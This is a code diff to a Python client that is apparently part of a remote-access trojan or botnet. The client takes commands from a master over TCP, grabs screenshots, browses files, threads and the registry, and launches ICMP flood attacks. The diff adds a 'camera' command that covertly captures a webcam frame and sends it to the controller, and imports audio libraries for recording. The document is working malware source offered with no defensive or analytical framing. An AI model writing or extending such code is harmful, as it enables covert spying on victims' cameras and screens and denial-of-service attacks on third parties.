@@ -12,6 +12,8 @@ import socket
 import struct
 import sys
 import psutil
+import cv2
+import numpy as np
 from PIL import ImageGrab, Image
 from Attacker import Attacker
 import platform
@@ -22,6 +24,9 @@ from FileExplorer import FileExplorer
 from ThreadExplorer import ThreadExplorer
 from RegExplorer import RegExplorer
 import random
+import pyaudio
+import wave
+from tqdm import tqdm
 
 flag_judge = False
 flag_thread = False
@@ -320,6 +325,14 @@ class clientThread(QThread):
                     self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
                     self.tcpPieceSend(imd, self.tcpSocket, 1024)
 
+                elif cmd == "camera_im":
+                    imd = data.tobytes()
+                    img_len = len(imd)
+                    self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
+                    self.tcpPieceSend(imd, self.tcpSocket, 1024)
+                    print("finish sending camera image")
+
+
                 elif cmd == "response":
                     self.tcpSocket.send(struct.pack('i', len(data.encode("utf8"))))
                     self.tcpSocket.send(data.encode("utf8"))
@@ -432,6 +445,8 @@ class clientThread(QThread):
                 self.attacker.icmpAttack(allcmd[1])
             elif cmd == 'floodStop':
                 self.attacker.enableStop = True
+            elif cmd == 'camera':
+                self.sendCamera()
             elif cmd == 'pic':
                 self.enablePic = True
                 self.sendPic(disposable=True)
@@ -570,17 +585,26 @@ class clientThread(QThread):
         data = json.dumps({'list': self.fileExplorer.list, 'pwd': os.getcwd()})
         self.tcpSend(cmd="filelist", data=data.encode('utf8'))
 
+    def sendCamera(self):
+        cap= cv2.VideoCapture(0)                       # 打开摄像头
+        ret, frame = cap.read()                        # 获得一帧图像
+        im = Image.fromarray(frame)
+        cap. release () 
+        im = im.resize((210, 180), Image.ANTIALIAS)
+        self.tcpSend(cmd='camera_im', data=im)
+
     def sendPic(self, disposable=False):
         while self.enablePic:
         #if self.enablePic:
             print("...", end='')
             im = ImageGrab.grab()
+            print(type(im)) # <class 'PIL.Image.Image'>
             #im = im.resize((self.width, int(im.size[1] * self.width / im.size[0])), Image.ANTIALIAS)
             im = im.resize((210, 180), Image.ANTIALIAS)
             self.tcpSend(cmd='pic', data=im)
             time.sleep(self.picTime * 0.5)
-            # if disposable:
-            #     break
+            if disposable:
+                break
 
     def searchMaster(self):
         udpPacket = UdpPacket() #udp数据报格式
